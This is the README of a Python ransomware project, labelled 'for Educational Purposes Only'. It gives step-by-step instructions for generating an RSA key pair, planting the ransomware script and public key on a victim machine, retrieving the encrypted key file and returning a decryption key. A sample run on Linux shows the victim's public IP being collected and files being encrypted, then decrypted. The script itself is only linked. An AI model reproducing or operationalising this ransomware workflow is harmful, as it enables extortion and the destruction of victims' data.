# Ransomware-in-Python

[![made-with-python](https://img.shields.io/badge/Made%20With-Python-success)](https://www.python.org/)

Ransomeware in Python (for Educational Purposes Only)

## How To Make This Work ?

![](https://raw.githubusercontent.com/whokilleddb/Ransomware-in-Python/main/Images/Ransomware.png)

-> First Generate A **RSA Key Pair** Using The [Key Generation Script](https://github.com/whokilleddb/Ransomware-in-Python/blob/main/keyGen.py)
-> Transfer the **Public Key (public.pem)** And The [Ransomware Script](https://github.com/whokilleddb/Ransomware-in-Python/blob/main/Ransomware.py)
-> Transfer Over The **EMAIL_Me.txt** Stored Under The Desktop Directory Of The Current User To The Attacker
-> Decrypt The **EMAIL_Me.txt** Using The **Private RSA Key (.private.pem)** Via The Same Key Generation Script](https://github.com/whokilleddb/Ransomware-in-Python/blob/main/keyGen.py)
-> A Text File Called **PUT_ME_ON_DESKTOP.txt** Is Generated 
-> Transfer Over **PUT_ME_ON_DESKTOP.txt** To The Victim And Place It In The Desktop Folder
-> BOOM ! The Files Are Decrypted Back !


### Sample Output On A Bodhi Linux :

```
bodhi@bodhi-32 ~/Ransomware> python3 Ransomware.py 
[+] Victim Is Running A Linux Environment
[+] System Root Found At : /home/bodhi
[+] Local Root Found At : /home/bodhi/Ransomware
[+] Public IP Of Victim : 202.142.107.55
[+] Generated Fernet Key As : b'UEoMPNynUBdfDAePrdXa7oYOM30Fd8dtD6X53EO0rIo='
[+] Created Crypter As : <cryptography.fernet.Fernet object at 0xb682958c>
[+] Crypter Object In Use : <cryptography.fernet.Fernet object at 0xb682958c>
/home/bodhi/Ransomware/test.txt is Being Encrypted 
/home/bodhi/Ransomware/test.txt Has Been Encrypted 
[+] Crypter Object In Use : <cryptography.fernet.Fernet object at 0xb682958c>
/home/bodhi/Ransomware/test.pdf is Being Encrypted 
/home/bodhi/Ransomware/test.pdf Has Been Encrypted 
[+] Wrote Fernet Key Into : fernet_key.txt
[+] Read Fernet Key From fernet_key.txt
[+] Read Public Key From public.pem As <_RSAobj @0xb701dd8c n(2048),e>
[+] Encrypted fernet_key.txt With Attacker's Public RSA Key
[+] Creted EMAIL_ME.txt at /home/bodhi/Desktop 
[+] Nullified Key as b'PJ(\x15\x05\xf2\x83\xfcC\x99\x98J\x1b\xf1t\xf5\xac\xa2\xd3(\xb7\xdbO\xe4\xc4\x9d\xf2\xa9\xf1\xbb\xcb\x17\xe5\xf4\'.H\x93\xae\xedsC\xb8\xd9\x94\x1a\xb8z\xfb\xdbb\xad\x9b\xfd\xf3|\xcar\xc3r\xf5-\xd8\xdd\xc4C[Vj\xc5f\xd4\x93\x85E"\x19\xf2\x9b\x89\xf7\xe7\x8c\xb6\xd8\xfack\x7fX\x81)L9\\<b\x1a\x0c\xce\x1e\xc3\x94\xfd\xd2\x1f\xc5\xee\x06\xd0\xdd\r\x83\x9e\xe071\xfa\x89\x83\x07\xf4\xc3VN\xdfU\x1e\xd0\n\xad["\xef\xd2aR\xe3\xad\x19\xa0\xd3"\x1f \\4\x0eCbs\xc1\xd9~\xb5\xca\x7f\xd7\xa6\x99~\x9e\xda\x17\xc4\r\xeb\xddT\xce\xb7R\xe2S\xf6\xa0\x18h\r\xf7\xde)\x83\xb6>\xe2\xee,\xe9\xf2\xb0\xb4\xedj\x19\xd1\x88\xf0\xe5j\xca\xf5\xcaa&\x0b\x87\xb08\xdc\xb7A\x1c\x9d2~\x11\xdc\x9f\x16M\xfd\xc18\x81f\xe4\xb0\x80\xbbG\xd8\xd3M\x04j\xf7d\'\xf3^\x05| \xdb\xf01\x92\xe6U\x86C\x8b,S\xc4'
[+] Nullified Crypter Object as None
 > Target Encrypted
 > Attack Completed
[-] Exception Rose As : 
[Errno 2] No such file or directory: '/home/bodhi/Desktop/PUT_ME_ON_DESKTOP.txt'

** (epiphany:4564): WARNING **: 01:00:39.767: webkit_web_context_set_web_process_count_limit is deprecated and does nothing. Limiting the number of web processes is no longer possible for security reasons

** (epiphany:4564): CRITICAL **: 01:00:39.769: void webkit_web_context_register_uri_scheme(WebKitWebContext*, const char*, WebKitURISchemeRequestCallback, gpointer, GDestroyNotify): assertion 'g_ascii_strcasecmp(scheme, "ftp") != 0' failed
Error sending IPC message: Broken pipe
[-] Exception Rose As : 
[Errno 2] No such file or directory: '/home/bodhi/Desktop/PUT_ME_ON_DESKTOP.txt'
[-] Exception Rose As : 
[Errno 2] No such file or directory: '/home/bodhi/Desktop/PUT_ME_ON_DESKTOP.txt'
[+] Read Key From /home/bodhi/Desktop/PUT_ME_ON_DESKTOP.txt As UEoMPNynUBdfDAePrdXa7oYOM30Fd8dtD6X53EO0rIo=
[+] New Cryptor Object Created As : <cryptography.fernet.Fernet object at 0xb71269ac>
[+] Crypter Object In Use : <cryptography.fernet.Fernet object at 0xb71269ac>
/home/bodhi/Ransomware/test.txt is Being Decrypted 
/home/bodhi/Ransomware/test.txt Has Been Decrypted 
[+] Crypter Object In Use : <cryptography.fernet.Fernet object at 0xb71269ac>
/home/bodhi/Ransomware/test.pdf is Being Decrypted 
/home/bodhi/Ransomware/test.pdf Has Been Decrypted 
```
